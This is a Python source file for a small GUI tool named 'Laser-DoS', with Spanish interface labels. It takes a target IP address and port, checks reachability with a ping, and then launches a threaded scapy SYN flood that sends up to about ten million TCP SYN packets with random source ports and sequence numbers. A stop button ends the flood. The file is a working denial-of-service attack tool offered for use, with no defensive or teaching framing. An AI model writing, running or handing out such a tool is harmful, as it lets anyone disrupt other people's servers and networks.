import tkinter as tk
from ping3 import ping
from scapy.all import IP, TCP, send, RandShort, RandInt
import threading
from PIL import Image, ImageTk


a = tk.Tk()
a.title("Laser-DoS")
a.geometry("600x300")
a.configure(bg="gray")
a.resizable(False, False)

Recuadro = tk.Entry(a, width=30)
Recuadro.place(x=270, y=200)

Recuadro2 = tk.Entry(a, width=30)
Recuadro2.place(x=320, y=150)

stop_attack = threading.Event()

def syn_flood(target_ip, target_port, packet_count=9999999):
    target_port = int(target_port) 
    for _ in range(packet_count):
        if stop_attack.is_set():
            break
        ipattack = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandInt())
        packet = ipattack / tcp
        send(packet, verbose=0)

def ataque():
    boton1.config(state="disabled")
    target_ip = Recuadro.get()
    target_port = Recuadro2.get()
    stop_attack.clear()
    thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    thread.daemon = True
    thread.start()

def parar_ataque():
    boton1.config(state="normal")
    stop_attack.set()

def IPv1():
    IP1 = Recuadro.get()
    hayping = ping(IP1, timeout=1)
    # Eliminar etiquetas previas para no acumular
    for widget in a.place_slaves():
        if getattr(widget, "is_ping_label", False):
            widget.destroy()
    if hayping:
        labelping = tk.Label(a, text="SI hay ping", bg="gray")
        boton1.config(state="normal")
    else:
        labelping = tk.Label(a, text="NO hay ping", bg="gray")
        boton1.config(state="disabled")
    labelping.is_ping_label = True
    labelping.place(x=490, y=200)


texto1 = tk.Label(a, text="Introduzca la IP:", font=("System", 20), bg="gray")
texto1.place(x=40, y=190)

texto2 = tk.Label(a, text="Introduzca el puerto:", font=("System", 20), bg="gray")
texto2.place(x=40, y=140)

boton1 = tk.Button(a, text="EMPIEZA HDP", command=ataque, state="disabled")
boton1.place(x=200, y=250)

boton3 = tk.Button(a, text="TEST PING", command=IPv1)
boton3.place(x=520, y=100)

boton2 = tk.Button(a, text="OK, RELAX", command=parar_ataque)
boton2.place(x=300, y=250)

class AnimatedGIF(tk.Label):
    def __init__(self, master, path, delay=100, size=None):
        super().__init__(master)
        self.delay = delay
        self.size = size  
        self.frames = []
        self.load_frames(path)
        self.idx = 0
        self.after(self.delay, self.play)

    def load_frames(self, path):
        im = Image.open(path)
        try:
            while True:
                frame = im.copy()
                if self.size:
                    frame = frame.resize(self.size, Image.LANCZOS)
                frame = ImageTk.PhotoImage(frame)
                self.frames.append(frame)
                im.seek(im.tell() + 1)
        except EOFError:
            pass

    def play(self):
        self.config(image=self.frames[self.idx])
        self.idx = (self.idx + 1) % len(self.frames)
        self.after(self.delay, self.play)

anim = AnimatedGIF(a, r"media\gif\laser.gif", delay=100, size=(500, 120))
anim.place(x=10, y=10)
anim.config(bg="gray")

a.mainloop()
